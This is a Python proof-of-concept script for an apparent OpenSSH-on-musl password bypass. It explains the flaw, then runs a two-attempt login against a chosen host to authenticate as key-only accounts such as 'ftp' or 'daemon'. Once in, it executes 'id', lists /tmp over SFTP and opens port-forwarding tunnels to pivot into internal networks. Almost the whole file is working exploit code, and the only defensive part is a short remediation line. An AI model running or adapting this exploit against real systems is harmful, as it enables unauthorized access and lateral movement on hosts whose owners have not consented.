#!/usr/bin/env python3
"""sshhole PoC — proof/demo for the OpenSSH + musl password bypass.

Affected combination
--------------------
OpenSSH < 10.6p2 built against musl without PAM, PasswordAuthentication
enabled, and a target account whose /etc/shadow password field is a single
"*" (key-only / system accounts: daemon, ftp, network, nobody; on Alpine also
root and cloud deploy users).

Why it works
------------
1. musl's crypt() returns the string "*" instead of NULL when it fails, and
   musl's sha512crypt refuses keys longer than 256 bytes (KEY_MAX, a DoS
   guard). So for any password of 257..1024 bytes crypt() returns "*".
2. sshd only feeds the stored field to crypt() when it has a usable salt
   (length >= 2), so for a "*" account it calls xcrypt(password, NULL).
3. xcrypt() then borrows a real salt via pick_salt(): it walks getpwent()
   and takes the salt of some other account that has a proper hash (root).
   It also wipes that borrowed hash with explicit_bzero() — which, in musl,
   clobbers the /etc/shadow buffer the current account's "*" was read from.
   That is why the *first* attempt always fails.
4. pick_salt() caches the borrowed salt in a static buffer for the lifetime
   of the sshd process. The sshd process is per-connection, so a *second*
   password attempt on the SAME connection re-reads the "*" field, uses the
   cached salt, crypt() returns "*", the two strings match and sshd accepts
   a password nobody knows.

The "*" account usually has /bin/false as its shell, so there is no
interactive shell. Authentication still succeeds, which is enough to open
SSH port-forwarding sessions and pivot into whatever the host can reach —
unless the account's shadow entry also has lastchg=0 (expired password),
which makes sshd restrict the session (no forwarding, no sftp, no pty).

Usage
-----
    ./sshhole-poc.py 10.2.0.210                  # default account 'ftp'
    ./sshhole-poc.py 10.2.0.210 -u daemon
    ./sshhole-poc.py 10.2.0.210 --boundary       # also probe 256/257/1024/1025
    ./sshhole-poc.py 10.2.0.210 --access         # what can the session do?
    ./sshhole-poc.py 10.2.0.210 --tunnel-target 10.2.0.1:80

Exit codes: 0 = bypass confirmed (host vulnerable), 1 = not vulnerable,
2 = could not reach / negotiate with the host.

Requires: python3 -m pip install paramiko
"""

from __future__ import annotations

import argparse
import socket
import sys

try:
    import paramiko
except ImportError:  # pragma: no cover
    sys.exit("paramiko is required: python3 -m pip install paramiko")

# musl's sha512 KEY_MAX is 256, so the smallest failing password is 257.
# OpenSSH's MAX_PASSWORD_LEN is 1024, so 1025 and up are refused before
# crypt() is ever called.
MIN_BYPASS_LEN = 257
MAX_BYPASS_LEN = 1024
PRIME_PASSWORD = "sshhole-prime-wrong-password"


def grab_banner(host: str, port: int, timeout: float) -> str:
    """Read the raw SSH identification string (pre-kex, no auth involved)."""
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        return sock.recv(256).decode("utf-8", "replace").strip()


def password_of_length(n: int) -> str:
    """Deterministic filler password of exactly n bytes."""
    seed = "sshhole"
    return (seed * (n // len(seed) + 1))[:n]


def try_bypass(host: str, port: int, user: str, length: int,
               timeout: float) -> tuple[str, paramiko.Transport | None]:
    """Run the two-attempt bypass on a single SSH connection.

    Returns (outcome, transport) where outcome is one of:
      "accepted"       - bypass worked, host is vulnerable
      "rejected"       - no bypass
      "prime-accepted" - the priming attempt authenticated, so this account
                         has a real password and the demo does not apply
      "error"          - connection/negotiation problem
    The transport is left open on "accepted" so callers can try forwarding.
    """
    try:
        transport = paramiko.Transport((host, port))
        transport.banner_timeout = timeout
        transport.auth_timeout = timeout
        transport.start_client(timeout=timeout)
    except (OSError, paramiko.SSHException) as exc:
        print(f"[!] connection failed: {exc}")
        return "error", None

    try:
        # Attempt 1: primes pick_salt()'s static cache (and always fails,
        # because the borrowed-hash wipe clobbers the "*" field).
        try:
            transport.auth_password(user, PRIME_PASSWORD)
            return "prime-accepted", transport
        except paramiko.AuthenticationException:
            pass
        except paramiko.SSHException as exc:
            print(f"[!] prime attempt failed to negotiate: {exc}")
            return "error", transport

        # Attempt 2: same connection, cached salt, 257-byte password.
        try:
            transport.auth_password(user, password_of_length(length))
            return "accepted", transport
        except paramiko.AuthenticationException:
            return "rejected", transport
        except paramiko.SSHException as exc:
            print(f"[!] bypass attempt failed to negotiate: {exc}")
            return "error", transport
    except Exception as exc:  # noqa: BLE001 - demo tool: report anything
        print(f"[!] unexpected error: {type(exc).__name__}: {exc}")
        return "error", transport


def probe_tunnel(transport: paramiko.Transport, target: str,
                 timeout: float = 8.0) -> bool:
    """Show the impact: open a direct-tcpip channel (what `ssh -L` does)
    through the authenticated session and pull a few bytes back. No shell on
    the gateway is needed for this."""
    thost, _, tport = target.partition(":")
    tport = int(tport or 80)
    try:
        chan = transport.open_channel("direct-tcpip", (thost, tport),
                                      ("127.0.0.1", 0), timeout=timeout)
    except Exception as exc:  # noqa: BLE001
        print(f"[-] TCP channel to {thost}:{tport} via the gateway failed: "
              f"{exc}")
        return False
    print(f"[+] TCP channel to {thost}:{tport} opened through the gateway "
          f"(no shell needed — this is `ssh -L`)")
    try:
        if tport == 80:
            chan.sendall(b"HEAD / HTTP/1.0\r\nHost: " + thost.encode() +
                         b"\r\n\r\n")
            reply = chan.recv(200)
            first = reply.split(b"\r\n", 1)[0].decode("utf-8", "replace")
            print(f"[+] remote end answered: {first or '(no data)'}")
    except Exception as exc:  # noqa: BLE001
        print(f"[!] channel open but no reply: {exc}")
    finally:
        chan.close()
    return True


def probe_access(transport: paramiko.Transport, timeout: float = 8.0) -> None:
    """Report what the bypassed session can actually do on this host.
    Useful because the impact depends on the account: shell, expiry status
    and forwarding policy."""
    try:
        chan = transport.open_session(timeout=timeout)
        print("[+] session channel opened")
        try:
            chan.exec_command("id")
            out = chan.makefile("r").read()
            if isinstance(out, bytes):
                out = out.decode("utf-8", "replace")
            out = out.strip()
            print(f"[+] exec 'id' -> {out or '(no output: nologin/false shell)'}")
        except Exception as exc:  # noqa: BLE001
            print(f"[!] exec failed: {exc}")
        chan.close()
    except Exception as exc:  # noqa: BLE001
        print(f"[-] session channel refused: {exc}")

    try:
        sftp = paramiko.SFTPClient.from_transport(transport)
        print(f"[+] sftp works, /tmp -> {sftp.listdir('/tmp')[:5]}")
        sftp.close()
    except Exception as exc:  # noqa: BLE001
        print(f"[-] sftp refused: {exc}")


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Demonstrate the OpenSSH+musl '*' account password bypass")
    ap.add_argument("host", help="target host, e.g. 10.2.0.210")
    ap.add_argument("-p", "--port", type=int, default=22)
    ap.add_argument("-u", "--user", default="ftp",
                    help="account with a '*' shadow field (default: ftp)")
    ap.add_argument("-t", "--timeout", type=float, default=8.0)
    ap.add_argument("--access", action="store_true",
                    help="after a successful bypass, report what the session "
                         "can actually do (shell, sftp)")
    ap.add_argument("--boundary", action="store_true",
                    help="probe 256/257/1024/1025 byte passwords")
    ap.add_argument("--tunnel-target", metavar="HOST:PORT",
                    help="after a successful bypass, open a direct-tcpip "
                         "channel to this address (pivot demo)")
    args = ap.parse_args()

    print(f"[*] target : {args.host}:{args.port} (account {args.user})")

    try:
        print(f"[*] banner : {grab_banner(args.host, args.port, args.timeout)}")
    except OSError as exc:
        print(f"[!] cannot reach {args.host}:{args.port}: {exc}")
        return 2

    lengths = [256, MIN_BYPASS_LEN, MAX_BYPASS_LEN, MAX_BYPASS_LEN + 1] \
        if args.boundary else [MIN_BYPASS_LEN]

    vulnerable = False
    for length in lengths:
        outcome, transport = try_bypass(args.host, args.port, args.user,
                                        length, args.timeout)
        if outcome == "prime-accepted":
            print("[!] that account has a real password — pick a '*' account "
                  "(daemon/ftp/network/nobody) or a key-only account")
            if transport:
                transport.close()
            return 2
        if outcome == "error":
            print("[!] could not complete the handshake; OpenSSH 10.x also "
                  "throttles failed logins per source IP (PerSourcePenalties) "
                  "— wait ~30 s and retry")
            if transport:
                transport.close()
            return 2

        if args.boundary:
            print(f"    {length:>4}-byte password -> {outcome}")
        else:
            print("[*] attempt 1: short wrong password -> rejected "
                  "(primes the cached salt)")
            print(f"[*] attempt 2: {length}-byte password -> {outcome}")
        if outcome == "accepted":
            vulnerable = True
            if args.access and transport:
                probe_access(transport, args.timeout)
            if args.tunnel_target and transport:
                probe_tunnel(transport, args.tunnel_target, args.timeout)
        if transport:
            transport.close()

    print(f"\n[=] verdict: {'VULNERABLE' if vulnerable else 'NOT VULNERABLE'}")
    if vulnerable:
        print("    Fix: echo 'PasswordAuthentication no' >> /etc/ssh/sshd_config")
        print("         && /etc/init.d/sshd restart   (see doc-021)")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
